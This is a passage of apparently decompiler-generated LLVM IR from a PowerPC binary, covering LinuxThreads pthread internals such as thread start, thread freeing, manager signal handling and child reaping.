  %v1_100159cc = add i32 %v3_100159c0, 16
  %v2_100159cc = inttoptr i32 %v1_100159cc to i32*
  %v3_100159cc = load i32, i32* %v2_100159cc, align 4
  %v0_100159d0 = load i32, i32* @r30, align 4
  %v4_100159d0 = icmp eq i32 %v0_100159d0, %v3_100159cc
  br i1 %v4_100159d0, label %dec_label_pc_100159e8, label %dec_label_pc_100159d8

dec_label_pc_100159d8:                            ; preds = %dec_label_pc_100159cc, %entry
  store i32 %v0_100159c0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100159e0.1051 to i32), i32* @lr, align 4
  %v0_100159dc = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015a88

dec_label_pc_100159e8:                            ; preds = %dec_label_pc_100159cc
  %v1_100159e8 = add i32 %v3_100159c0, 45
  %v2_100159e8 = inttoptr i32 %v1_100159e8 to i8*
  %v3_100159e8 = load i8, i8* %v2_100159e8, align 1
  %v3_100159ec = icmp eq i8 %v3_100159e8, 0
  br i1 %v3_100159ec, label %dec_label_pc_10015a04, label %dec_label_pc_100159f4

dec_label_pc_100159f4:                            ; preds = %dec_label_pc_100159e8
  store i32 %v0_100159c0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100159fc.1052 to i32), i32* @lr, align 4
  %v0_100159f8 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015a88

dec_label_pc_10015a04:                            ; preds = %dec_label_pc_100159e8
  %v1_10015a04 = add i32 %v3_100159c0, 56
  %v2_10015a04 = inttoptr i32 %v1_10015a04 to i32*
  %v3_10015a04 = load i32, i32* %v2_10015a04, align 4
  %v3_10015a08 = icmp eq i32 %v3_10015a04, 0
  br i1 %v3_10015a08, label %dec_label_pc_10015a1c, label %dec_label_pc_10015a10

dec_label_pc_10015a10:                            ; preds = %dec_label_pc_10015a04
  store i32 %v0_100159c0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10015a18.1053 to i32), i32* @lr, align 4
  %v0_10015a14 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015a84

dec_label_pc_10015a1c:                            ; preds = %dec_label_pc_10015a04
  %v1_10015a20 = add i32 %v3_100159c0, 44
  %v2_10015a20 = inttoptr i32 %v1_10015a20 to i8*
  %v3_10015a20 = load i8, i8* %v2_10015a20, align 1
  %v4_10015a20 = zext i8 %v3_10015a20 to i32
  store i32 %v4_10015a20, i32* %r29.global-to-local, align 4
  store i8 1, i8* %v2_100159e8, align 1
  %v0_10015a28 = load i32, i32* @r31, align 4
  store i32 %v0_10015a28, i32* @r3, align 4
  store i32 268524080, i32* @lr, align 4
  %v0_10015a2c = call i32 @__pthread_unlock()
  %v0_10015a30 = load i32, i32* %r29.global-to-local, align 4
  %v3_10015a30 = icmp eq i32 %v0_10015a30, 0
  br i1 %v3_10015a30, label %dec_label_pc_10015a84, label %dec_label_pc_10015a38

dec_label_pc_10015a38:                            ; preds = %dec_label_pc_10015a1c
  %v3_10015a3c = load i32, i32* @global_var_100450c4.984, align 4
  %v1_10015a40 = icmp slt i32 %v3_10015a3c, 0
  br i1 %v1_10015a40, label %dec_label_pc_10015a84, label %dec_label_pc_10015a48

dec_label_pc_10015a48:                            ; preds = %dec_label_pc_10015a38
  %v0_10015a54 = load i32, i32* @r2, align 4
  store i32 %v0_10015a54, i32* %stack_var_-184, align 4
  %v2_10015a5c = ptrtoint i32* %stack_var_-184 to i32
  store i32 268524140, i32* @lr, align 4
  %v2_10015a688 = call i32 @__libc_write(i32 %v3_10015a3c, i32 %v2_10015a5c)
  %v3_10015a6c11 = icmp eq i32 %v2_10015a688, -1
  br i1 %v3_10015a6c11, label %dec_label_pc_10015a74, label %dec_label_pc_10015a84

dec_label_pc_10015a74:                            ; preds = %dec_label_pc_10015a48, %dec_label_pc_10015a74.dec_label_pc_10015a58_crit_edge
  %v0_10015a74 = call i32 @__errno_location()
  %v1_10015a78 = inttoptr i32 %v0_10015a74 to i32*
  %v2_10015a78 = load i32, i32* %v1_10015a78, align 4
  %v3_10015a7c = icmp eq i32 %v2_10015a78, 4
  br i1 %v3_10015a7c, label %dec_label_pc_10015a74.dec_label_pc_10015a58_crit_edge, label %dec_label_pc_10015a84

dec_label_pc_10015a74.dec_label_pc_10015a58_crit_edge: ; preds = %dec_label_pc_10015a74
  %v3_10015a60.pre = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268524140, i32* @lr, align 4
  %v2_10015a68 = call i32 @__libc_write(i32 %v3_10015a60.pre, i32 %v2_10015a5c)
  %v3_10015a6c = icmp eq i32 %v2_10015a68, -1
  br i1 %v3_10015a6c, label %dec_label_pc_10015a74, label %dec_label_pc_10015a84

dec_label_pc_10015a84:                            ; preds = %dec_label_pc_10015a48, %dec_label_pc_10015a74, %dec_label_pc_10015a74.dec_label_pc_10015a58_crit_edge, %dec_label_pc_10015a38, %dec_label_pc_10015a1c, %dec_label_pc_10015a10
  br label %dec_label_pc_10015a88

dec_label_pc_10015a88:                            ; preds = %dec_label_pc_100159f4, %dec_label_pc_100159d8, %dec_label_pc_10015a84
  %v0_10015a98 = phi i32 [ 22, %dec_label_pc_100159f4 ], [ 3, %dec_label_pc_100159d8 ], [ 0, %dec_label_pc_10015a84 ]
  ret i32 %v0_10015a98

; uselistorder directives
  uselistorder i32 %v2_10015a5c, { 1, 0 }
  uselistorder i32 %v0_100159c0, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 268524140, { 1, 0 }
  uselistorder label %dec_label_pc_10015a88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015a84, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_10015a74, { 1, 0 }
}

define i32 @__fresetlockfiles(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10015aa8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10015aa8, i32* %r29.global-to-local, align 4
  %v2_10015ab4 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-40)
  %v3_10015ac0 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-40, i32 1)
  %storemerge1 = load i32, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_10015ad84 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10015ad84, label %dec_label_pc_10015aec, label %dec_label_pc_10015ad0

dec_label_pc_10015ad0:                            ; preds = %entry, %dec_label_pc_10015ad0
  %v1_10015ae07.in = phi i32 [ %storemerge, %dec_label_pc_10015ad0 ], [ %storemerge1, %entry ]
  %v1_10015ae07 = add i32 %v1_10015ae07.in, 56
  %v3_10015ad0 = call i32 @pthread_mutex_init(i32 %v1_10015ae07, i32* nonnull %stack_var_-40)
  %v0_10015ad4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10015ad4 = add i32 %v0_10015ad4, 32
  %v2_10015ad4 = inttoptr i32 %v1_10015ad4 to i32*
  %storemerge = load i32, i32* %v2_10015ad4, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10015ad8 = icmp eq i32 %storemerge, 0
  br i1 %v3_10015ad8, label %dec_label_pc_10015aec, label %dec_label_pc_10015ad0

dec_label_pc_10015aec:                            ; preds = %dec_label_pc_10015ad0, %entry
  %v1_10015af0 = call i32 @pthread_mutexattr_destroy(i32 %v2_10015aa8)
  ret i32 %v1_10015af0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015ad0, { 1, 0 }
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r31, align 4
  %v3_10015b24 = load i32, i32* @global_var_10040ab8.1054, align 4
  %v3_10015b28 = icmp slt i32 %v3_10015b24, %arg1
  br i1 %v3_10015b28, label %dec_label_pc_10015b30, label %dec_label_pc_10015b64

dec_label_pc_10015b30:                            ; preds = %entry
  store i32 268524340, i32* @lr, align 4
  %v1_10015b30 = call i32 @sched_get_priority_max(i32 1)
  %v0_10015b48 = call i32 @__asm_mfcr()
  %v1_10015b4c = call i32 @__asm_rlwinm(i32 %v0_10015b48, i32 29, i32 31, i32 31)
  store i32 268524384, i32* @lr, align 4
  %v0_10015b5c = call i32 @sched_setscheduler()
  %v0_10015b60 = load i32, i32* @r31, align 4
  store i32 %v0_10015b60, i32* @global_var_10040ab8.1054, align 4
  br label %dec_label_pc_10015b64

dec_label_pc_10015b64:                            ; preds = %entry, %dec_label_pc_10015b30
  %v0_10015b74 = phi i32 [ 1, %entry ], [ %v0_10015b5c, %dec_label_pc_10015b30 ]
  ret i32 %v0_10015b74

; uselistorder directives
  uselistorder label %dec_label_pc_10015b64, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %v3_10015b88 = load i32, i32* @global_var_100451e0.1055, align 4
  %v3_10015b90 = icmp eq i32 %v3_10015b88, 0
  br i1 %v3_10015b90, label %dec_label_pc_10015b98, label %dec_label_pc_10015bac

dec_label_pc_10015b98:                            ; preds = %entry
  br label %dec_label_pc_10015bac

dec_label_pc_10015bac:                            ; preds = %entry, %dec_label_pc_10015b98
  %v0_10015bac = phi i1 [ false, %dec_label_pc_10015b98 ], [ true, %entry ]
  store i32 1, i32* @global_var_100451e0.1055, align 4
  br i1 %v0_10015bac, label %dec_label_pc_10015bac.dec_label_pc_10015bfc_crit_edge, label %dec_label_pc_10015bc0

dec_label_pc_10015bac.dec_label_pc_10015bfc_crit_edge: ; preds = %dec_label_pc_10015bac
  %v0_10015c08.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10015bfc

dec_label_pc_10015bc0:                            ; preds = %dec_label_pc_10015bac
  store i32 0, i32* %stack_var_-168, align 4
  %v2_10015bd4 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10015bd0

dec_label_pc_10015bd0:                            ; preds = %dec_label_pc_10015bec, %dec_label_pc_10015bc0
  %v3_10015bd8 = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268524516, i32* @lr, align 4
  %v2_10015be0 = call i32 @__libc_write(i32 %v3_10015bd8, i32 %v2_10015bd4)
  %v3_10015be4 = icmp eq i32 %v2_10015be0, -1
  br i1 %v3_10015be4, label %dec_label_pc_10015bec, label %dec_label_pc_10015bfc

dec_label_pc_10015bec:                            ; preds = %dec_label_pc_10015bd0
  %v0_10015bec = call i32 @__errno_location()
  %v1_10015bf0 = inttoptr i32 %v0_10015bec to i32*
  %v2_10015bf0 = load i32, i32* %v1_10015bf0, align 4
  %v3_10015bf4 = icmp eq i32 %v2_10015bf0, 4
  br i1 %v3_10015bf4, label %dec_label_pc_10015bd0, label %dec_label_pc_10015bfc

dec_label_pc_10015bfc:                            ; preds = %dec_label_pc_10015bd0, %dec_label_pc_10015bec, %dec_label_pc_10015bac.dec_label_pc_10015bfc_crit_edge
  %v0_10015c08 = phi i32 [ %v0_10015c08.pre, %dec_label_pc_10015bac.dec_label_pc_10015bfc_crit_edge ], [ %v2_10015be0, %dec_label_pc_10015bd0 ], [ %v0_10015bec, %dec_label_pc_10015bec ]
  ret i32 %v0_10015c08

; uselistorder directives
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder label %dec_label_pc_10015bfc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015bac, { 1, 0 }
}

define i32 @pthread_kill_all_threads(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10015c54:
  %v3_10015c54 = icmp eq i32 %arg2, 0
  br i1 %v3_10015c54, label %dec_label_pc_10015c64, label %dec_label_pc_10015c5c

dec_label_pc_10015c5c:                            ; preds = %dec_label_pc_10015c54
  %v3_10015c28 = load i32, i32* @global_var_100450c0, align 4
  %v1_10015c5c = add i32 %v3_10015c28, 20
  %v2_10015c5c = inttoptr i32 %v1_10015c5c to i32*
  %v3_10015c5c = load i32, i32* %v2_10015c5c, align 4
  store i32 268524644, i32* @lr, align 4
  %v2_10015c60 = call i32 @kill(i32 %v3_10015c5c, i32 %arg1)
  br label %dec_label_pc_10015c64

dec_label_pc_10015c64:                            ; preds = %dec_label_pc_10015c54, %dec_label_pc_10015c5c
  %v0_10015c74 = phi i32 [ %arg1, %dec_label_pc_10015c54 ], [ %v2_10015c60, %dec_label_pc_10015c5c ]
  ret i32 %v0_10015c74

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10015c64, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-164 = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268524692, i32* @lr, align 4
  %v0_10015c90 = call i32 @__libc_getpid()
  %v1_10015c94 = load i32, i32* @r31, align 4
  %v2_10015c94 = add i32 %v1_10015c94, 20
  %v3_10015c94 = inttoptr i32 %v2_10015c94 to i32*
  store i32 %v0_10015c90, i32* %v3_10015c94, align 4
  %v0_10015c98 = load i32, i32* @r31, align 4
  %v1_10015c98 = add i32 %v0_10015c98, 100
  store i32 268524712, i32* @lr, align 4
  %v3_10015ca4 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_10015c98, i32 0)
  %v0_10015ca8 = load i32, i32* @r31, align 4
  %v1_10015ca8 = add i32 %v0_10015ca8, 228
  %v2_10015ca8 = inttoptr i32 %v1_10015ca8 to i32*
  %v3_10015ca8 = load i32, i32* %v2_10015ca8, align 4
  %v1_10015cac = icmp slt i32 %v3_10015ca8, 0
  br i1 %v1_10015cac, label %dec_label_pc_10015cc0, label %dec_label_pc_10015cb4

dec_label_pc_10015cb4:                            ; preds = %entry
  br label %dec_label_pc_10015ce4

dec_label_pc_10015cc0:                            ; preds = %entry
  %v3_10015cc4 = load i32, i32* @global_var_10040ab8.1054, align 4
  %tmp7 = icmp slt i32 %v3_10015cc4, 1
  br i1 %tmp7, label %dec_label_pc_10015ce8, label %dec_label_pc_10015cd0

dec_label_pc_10015cd0:                            ; preds = %dec_label_pc_10015cc0
  br label %dec_label_pc_10015ce4

dec_label_pc_10015ce4:                            ; preds = %dec_label_pc_10015cb4, %dec_label_pc_10015cd0
  store i32 268524776, i32* @lr, align 4
  %v0_10015ce4 = call i32 @sched_setscheduler()
  br label %dec_label_pc_10015ce8

dec_label_pc_10015ce8:                            ; preds = %dec_label_pc_10015cc0, %dec_label_pc_10015ce4
  %v3_10015cec = load i32, i32* @global_var_100451fc.1018, align 4
  %v3_10015cf0 = icmp eq i32 %v3_10015cec, 0
  br i1 %v3_10015cf0, label %dec_label_pc_10015d48, label %dec_label_pc_10015cf8

dec_label_pc_10015cf8:                            ; preds = %dec_label_pc_10015ce8
  %v3_10015cfc = load i32, i32* @global_var_100450ec.994, align 4
  %tmp8 = icmp slt i32 %v3_10015cfc, 1
  br i1 %tmp8, label %dec_label_pc_10015d48, label %dec_label_pc_10015d08

dec_label_pc_10015d08:                            ; preds = %dec_label_pc_10015cf8
  %v0_10015d0c = load i32, i32* @r31, align 4
  store i32 %v0_10015d0c, i32* %stack_var_-164, align 4
  %v2_10015d18 = ptrtoint i32* %stack_var_-164 to i32
  br label %dec_label_pc_10015d14

dec_label_pc_10015d14:                            ; preds = %dec_label_pc_10015d30, %dec_label_pc_10015d08
  %v3_10015d1c = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268524840, i32* @lr, align 4
  %v2_10015d24 = call i32 @__libc_write(i32 %v3_10015d1c, i32 %v2_10015d18)
  %v3_10015d28 = icmp eq i32 %v2_10015d24, -1
  br i1 %v3_10015d28, label %dec_label_pc_10015d30, label %dec_label_pc_10015d40

dec_label_pc_10015d30:                            ; preds = %dec_label_pc_10015d14
  %v0_10015d30 = call i32 @__errno_location()
  %v1_10015d34 = inttoptr i32 %v0_10015d30 to i32*
  %v2_10015d34 = load i32, i32* %v1_10015d34, align 4
  %v3_10015d38 = icmp eq i32 %v2_10015d34, 4
  br i1 %v3_10015d38, label %dec_label_pc_10015d14, label %dec_label_pc_10015d40

dec_label_pc_10015d40:                            ; preds = %dec_label_pc_10015d14, %dec_label_pc_10015d30
  %v0_10015d40 = load i32, i32* @r31, align 4
  store i32 %v0_10015d40, i32* @r3, align 4
  store i32 268524872, i32* @lr, align 4
  %v0_10015d44 = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_10015d48

dec_label_pc_10015d48:                            ; preds = %dec_label_pc_10015cf8, %dec_label_pc_10015ce8, %dec_label_pc_10015d40
  %v0_10015d48 = load i32, i32* @r31, align 4
  %v1_10015d4c = add i32 %v0_10015d48, 92
  %v2_10015d4c = inttoptr i32 %v1_10015d4c to i32*
  %v3_10015d4c = load i32, i32* %v2_10015d4c, align 4
  call void @__pseudo_call(i32 %v3_10015d4c)
  %v0_10015d5c = call i32 @__pthread_do_exit()
  ret i32 %v0_10015d5c

; uselistorder directives
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i32 ()* @sched_setscheduler, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10015d48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015d40, { 1, 0 }
  uselistorder label %dec_label_pc_10015ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10015ce4, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268524924, i32* @lr, align 4
  %v0_10015d78 = call i32 @__libc_getpid()
  store i32 0, i32* @r4, align 4
  %v1_10015d80 = load i32, i32* @r29, align 4
  %v2_10015d80 = add i32 %v1_10015d80, 20
  %v3_10015d80 = inttoptr i32 %v2_10015d80 to i32*
  store i32 %v0_10015d78, i32* %v3_10015d80, align 4
  %v0_10015d84 = load i32, i32* @r29, align 4
  %v1_10015d84 = add i32 %v0_10015d84, 28
  %v2_10015d84 = inttoptr i32 %v1_10015d84 to i32*
  %v3_10015d84 = load i32, i32* %v2_10015d84, align 4
  store i32 %v3_10015d84, i32* @r3, align 4
  store i32 268524940, i32* @lr, align 4
  %v0_10015d88 = call i32 @__pthread_lock()
  %v0_10015d8c = load i32, i32* @r29, align 4
  %v1_10015d8c = add i32 %v0_10015d8c, 28
  %v2_10015d8c = inttoptr i32 %v1_10015d8c to i32*
  %v3_10015d8c = load i32, i32* %v2_10015d8c, align 4
  store i32 %v3_10015d8c, i32* @r3, align 4
  store i32 268524948, i32* @lr, align 4
  %v0_10015d90 = call i32 @__pthread_unlock()
  %v0_10015d94 = load i32, i32* @r29, align 4
  %v1_10015d98 = call i32 @pthread_start_thread(i32 %v0_10015d94)
  ret i32 %v1_10015d98

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @pthread_free(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  %v1_10015dbc = add i32 %arg1, 16
  %v2_10015dbc = inttoptr i32 %v1_10015dbc to i32*
  %v3_10015dbc = load i32, i32* %v2_10015dbc, align 4
  %v1_10015dc0 = call i32 @__asm_rlwinm(i32 %v3_10015dbc, i32 4, i32 18, i32 27)
  %v2_10015dc4 = add i32 %v1_10015dc0, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %v2_10015dc4, i32* @r29, align 4
  store i32 %v2_10015dc4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10015dd0.1057 to i32), i32* @lr, align 4
  %v0_10015dcc = call i32 @__pthread_lock()
  %v1_10015dd4 = load i32, i32* @r29, align 4
  %v2_10015dd4 = add i32 %v1_10015dd4, 8
  %v3_10015dd4 = inttoptr i32 %v2_10015dd4 to i32*
  store i32 0, i32* %v3_10015dd4, align 4
  %v1_10015ddc = load i32, i32* @r29, align 4
  %v2_10015ddc = add i32 %v1_10015ddc, 12
  %v3_10015ddc = inttoptr i32 %v2_10015ddc to i32*
  store i32 -1, i32* %v3_10015ddc, align 4
  %v0_10015de0 = load i32, i32* @r29, align 4
  store i32 %v0_10015de0, i32* @r3, align 4
  store i32 268525032, i32* @lr, align 4
  %v0_10015de4 = call i32 @__pthread_unlock()
  %v3_10015dec = load i32, i32* @global_var_10045100.1058, align 4
  %v1_10015df0 = add i32 %v3_10015dec, -1
  store i32 %v1_10015df0, i32* @global_var_10045100.1058, align 4
  %v0_10015df8 = load i32, i32* @r31, align 4
  %v1_10015df8 = add i32 %v0_10015df8, 448
  %v2_10015df8 = inttoptr i32 %v1_10015df8 to i32*
  %v3_10015df8 = load i32, i32* %v2_10015df8, align 4
  %v3_10015e087 = icmp eq i32 %v3_10015df8, 0
  store i32 %v3_10015df8, i32* @r3, align 4
  br i1 %v3_10015e087, label %dec_label_pc_10015e14, label %dec_label_pc_10015e00

dec_label_pc_10015e00:                            ; preds = %entry, %dec_label_pc_10015e00
  %v0_10015e00 = phi i32 [ %v0_10015e08.pr, %dec_label_pc_10015e00 ], [ %v3_10015df8, %entry ]
  %v1_10015e00 = inttoptr i32 %v0_10015e00 to i32*
  %v2_10015e00 = load i32, i32* %v1_10015e00, align 4
  store i32 %v2_10015e00, i32* @r29, align 4
  store i32 268525064, i32* @lr, align 4
  %v0_10015e04 = call i32 @free()
  %v0_10015e08.pr = load i32, i32* @r29, align 4
  %v3_10015e08 = icmp eq i32 %v0_10015e08.pr, 0
  store i32 %v0_10015e08.pr, i32* @r3, align 4
  br i1 %v3_10015e08, label %dec_label_pc_10015e08.dec_label_pc_10015e14_crit_edge, label %dec_label_pc_10015e00

dec_label_pc_10015e08.dec_label_pc_10015e14_crit_edge: ; preds = %dec_label_pc_10015e00
  %v0_10015e14.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015e14

dec_label_pc_10015e14:                            ; preds = %dec_label_pc_10015e08.dec_label_pc_10015e14_crit_edge, %entry
  %v0_10015e14 = phi i32 [ %v0_10015e14.pre, %dec_label_pc_10015e08.dec_label_pc_10015e14_crit_edge ], [ %v0_10015df8, %entry ]
  %v1_10015e14 = add i32 %v0_10015e14, 452
  %v2_10015e14 = inttoptr i32 %v1_10015e14 to i32*
  %v3_10015e14 = load i32, i32* %v2_10015e14, align 4
  %v3_10015e243 = icmp eq i32 %v3_10015e14, 0
  store i32 %v3_10015e14, i32* @r3, align 4
  br i1 %v3_10015e243, label %dec_label_pc_10015e30, label %dec_label_pc_10015e1c

dec_label_pc_10015e1c:                            ; preds = %dec_label_pc_10015e14, %dec_label_pc_10015e1c
  %v0_10015e1c = phi i32 [ %v0_10015e24.pr, %dec_label_pc_10015e1c ], [ %v3_10015e14, %dec_label_pc_10015e14 ]
  %v1_10015e1c = inttoptr i32 %v0_10015e1c to i32*
  %v2_10015e1c = load i32, i32* %v1_10015e1c, align 4
  store i32 %v2_10015e1c, i32* @r29, align 4
  store i32 268525092, i32* @lr, align 4
  %v0_10015e20 = call i32 @free()
  %v0_10015e24.pr = load i32, i32* @r29, align 4
  %v3_10015e24 = icmp eq i32 %v0_10015e24.pr, 0
  store i32 %v0_10015e24.pr, i32* @r3, align 4
  br i1 %v3_10015e24, label %dec_label_pc_10015e24.dec_label_pc_10015e30_crit_edge, label %dec_label_pc_10015e1c

dec_label_pc_10015e24.dec_label_pc_10015e30_crit_edge: ; preds = %dec_label_pc_10015e1c
  %v0_10015e38.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015e30

dec_label_pc_10015e30:                            ; preds = %dec_label_pc_10015e24.dec_label_pc_10015e30_crit_edge, %dec_label_pc_10015e14
  %v0_10015e58 = phi i32 [ %v0_10015e38.pre, %dec_label_pc_10015e24.dec_label_pc_10015e30_crit_edge ], [ %v0_10015e14, %dec_label_pc_10015e14 ]
  %v4_10015e38 = icmp eq i32 %v0_10015e58, ptrtoint (i32* @global_var_100408c0 to i32)
  br i1 %v4_10015e38, label %dec_label_pc_10015e70, label %dec_label_pc_10015e40

dec_label_pc_10015e40:                            ; preds = %dec_label_pc_10015e30
  %v1_10015e40 = add i32 %v0_10015e58, 392
  %v2_10015e40 = inttoptr i32 %v1_10015e40 to i32*
  %v3_10015e40 = load i32, i32* %v2_10015e40, align 4
  %v3_10015e44 = icmp eq i32 %v3_10015e40, 0
  br i1 %v3_10015e44, label %dec_label_pc_10015e4c, label %dec_label_pc_10015e70

dec_label_pc_10015e4c:                            ; preds = %dec_label_pc_10015e40
  %v1_10015e4c = add i32 %v0_10015e58, 400
  %v2_10015e4c = inttoptr i32 %v1_10015e4c to i32*
  %v3_10015e4c = load i32, i32* %v2_10015e4c, align 4
  %v3_10015e50 = icmp eq i32 %v3_10015e4c, 0
  br i1 %v3_10015e50, label %dec_label_pc_10015e60, label %dec_label_pc_10015e58

dec_label_pc_10015e58:                            ; preds = %dec_label_pc_10015e4c
  %v1_10015e58 = add i32 %v0_10015e58, 396
  %v2_10015e58 = inttoptr i32 %v1_10015e58 to i32*
  %v3_10015e58 = load i32, i32* %v2_10015e58, align 4
  store i32 268525152, i32* @lr, align 4
  %v2_10015e5c = call i32 @munmap(i32 %v3_10015e58, i32 %v3_10015e4c)
  %v0_10015e60.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015e60

dec_label_pc_10015e60:                            ; preds = %dec_label_pc_10015e4c, %dec_label_pc_10015e58
  %v0_10015e60 = phi i32 [ %v0_10015e58, %dec_label_pc_10015e4c ], [ %v0_10015e60.pre, %dec_label_pc_10015e58 ]
  %v1_10015e68 = add i32 %v0_10015e60, -2096672
  store i32 268525168, i32* @lr, align 4
  %v2_10015e6c = call i32 @munmap(i32 %v1_10015e68, i32 2097152)
  br label %dec_label_pc_10015e70

dec_label_pc_10015e70:                            ; preds = %dec_label_pc_10015e40, %dec_label_pc_10015e30, %dec_label_pc_10015e60
  %v0_10015e80 = phi i32 [ 0, %dec_label_pc_10015e40 ], [ 0, %dec_label_pc_10015e30 ], [ %v2_10015e6c, %dec_label_pc_10015e60 ]
  ret i32 %v0_10015e80

; uselistorder directives
  uselistorder i32 %v0_10015e24.pr, { 1, 2, 0 }
  uselistorder i32 %v0_10015e08.pr, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100408c0 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_10015e70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015e60, { 1, 0 }
  uselistorder label %dec_label_pc_10015e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10015e00, { 1, 0 }
}

define i32 @restart.4() local_unnamed_addr {
entry:
  store i32 268525204, i32* @lr, align 4
  %v0_10015e90 = call i32 @__pthread_restart_new()
  ret i32 %v0_10015e90
}

define i32 @pthread_reap_children(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10015fc0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10015fc0, i32* @r4, align 4
  store i32 268525512, i32* @lr, align 4
  %v3_10015fc49 = call i32 @__libc_waitpid(i32 -1, i32 %v2_10015fc0, i32 -2147483647)
  %v2_10015fc810 = icmp sgt i32 %v3_10015fc49, 0
  br i1 %v2_10015fc810, label %dec_label_pc_10015f64, label %dec_label_pc_10015fd0

dec_label_pc_10015f64:                            ; preds = %entry, %dec_label_pc_10015fb4.backedge
  %v3_10015f68 = load i32, i32* @global_var_100451e4.1056, align 4
  %v3_10015f6c = icmp eq i32 %v3_10015f68, 0
  br i1 %v3_10015f6c, label %dec_label_pc_10015f8c, label %dec_label_pc_10015f74

dec_label_pc_10015f74:                            ; preds = %dec_label_pc_10015f64
  %v3_10015ebc = load i32, i32* @global_var_100450c0, align 4
  store i32 %v3_10015ebc, i32* @r3, align 4
  store i32 268525452, i32* @lr, align 4
  %v0_10015f88 = call i32 @restart.4()
  br label %dec_label_pc_10015f8c

dec_label_pc_10015f8c:                            ; preds = %dec_label_pc_10015f64, %dec_label_pc_10015f74
  %v3_10015f8c = load i32, i32* %stack_var_-40, align 4
  %v1_10015f90 = urem i32 %v3_10015f8c, 128
  %v1_10015f94 = mul nuw nsw i32 %v1_10015f90, 16777216
  %v1_10015f98 = add nuw i32 %v1_10015f94, 16777216
  %v2_10015f98 = sdiv i32 %v1_10015f98, 16777216
  %v1_10015f9c = udiv i32 %v2_10015f98, 2
  %v2_10015f9c = and i32 %v2_10015f98, -2147483648
  %v3_10015f9c = or i32 %v1_10015f9c, %v2_10015f9c
  %tmp8 = icmp slt i32 %v3_10015f9c, 1
  br i1 %tmp8, label %dec_label_pc_10015fb4.backedge, label %dec_label_pc_10015fa4

dec_label_pc_10015fa4:                            ; preds = %dec_label_pc_10015f8c
  store i32 ptrtoint ([3 x i8]* @global_var_10015fac.1060 to i32), i32* @lr, align 4
  %v2_10015fa8 = call i32 @pthread_kill_all_threads(i32 %v1_10015f90, i32 1)
  %v1_10015fb0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10015fb4.backedge

dec_label_pc_10015fb4.backedge:                   ; preds = %dec_label_pc_10015fa4, %dec_label_pc_10015f8c
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10015fc0, i32* @r4, align 4
  store i32 268525512, i32* @lr, align 4
  %v3_10015fc4 = call i32 @__libc_waitpid(i32 -1, i32 %v2_10015fc0, i32 -2147483647)
  %v2_10015fc8 = icmp sgt i32 %v3_10015fc4, 0
